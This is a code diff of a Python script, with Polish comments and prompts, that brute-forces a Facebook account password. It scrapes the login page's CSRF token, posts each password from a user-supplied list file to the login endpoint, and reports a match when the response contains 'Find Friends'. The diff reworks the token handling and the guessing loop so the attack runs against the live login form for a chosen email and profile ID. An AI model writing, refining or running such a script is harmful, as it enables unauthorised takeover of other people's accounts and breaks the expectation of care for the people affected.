@@ -2,39 +2,43 @@ import requests
 from bs4 import BeautifulSoup
 
 def get_csrf_token(session):
-    response = session.get("https://www.facebook.com/")
+    home_url = "https://www.facebook.com"
+    response = session.get(home_url)
     soup = BeautifulSoup(response.text, "html.parser")
-    csrf_token = soup.find("input", {"name": "fb_dtsg"})["value"]
+    csrf_token = soup.find("input", {"name": "fb_dtsg"})
+    if csrf_token:
+        csrf_token = csrf_token["value"]
     return csrf_token
 
 def brute_force(email, fb_id, passwords):
-    with requests.Session() as session:
-        # Logowanie do Facebooka
-        login_data = {
+    login_url = "https://www.facebook.com/login.php"
+    session = requests.Session()
+
+    # Uzyskaj CSRF token
+    csrf_token = get_csrf_token(session)
+    if not csrf_token:
+        print("Nie udało się uzyskać tokenu CSRF.")
+        return
+
+    for password in passwords:
+        data = {
             "email": email,
-            "pass": passwords[0],  # Zakładamy, że pierwsze hasło jest poprawne
-            "login": "Zaloguj się"
+            "pass": password,
+            "fb_dtsg": csrf_token
         }
-        session.post("https://www.facebook.com/login.php", data=login_data)
+        headers = {
+            "Referer": "https://www.facebook.com/",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
 
-        # Pobieranie tokenu CSRF
-        csrf_token = get_csrf_token(session)
+        response = session.post(login_url, data=data, headers=headers)
+        print(response.text)  # Debugging line to print response content
 
-        # Próba złamania hasła
-        for password in passwords:
-            data = {
-                "email": email,
-                "pass": password,
-                "fb_dtsg": csrf_token,
-                "login": "Zaloguj się"
-            }
-
-            response = session.post(f"https://www.facebook.com/{fb_id}", data=data)
-            if "Find Friends" in response.text:
-                print(f"Hasło znalezione: {password}")
-                break
-            else:
-                print(f"Błędne hasło: {password}")
+        if "Find Friends" in response.text:
+            print(f"Hasło znalezione: {password}")
+            break
+        else:
+            print(f"Błędne hasło: {password}")
 
 if __name__ == "__main__":
     email = input("Podaj adres e-mail (jako nazwę użytkownika): ")
@@ -42,6 +46,6 @@ if __name__ == "__main__":
     password_file = input("Podaj nazwę pliku z hasłami: ")
 
     with open(password_file, "r") as file:
-        passwords = [line.strip() for line in file]
+        passwords = file.read().splitlines()
 
     brute_force(email, fb_id, passwords)
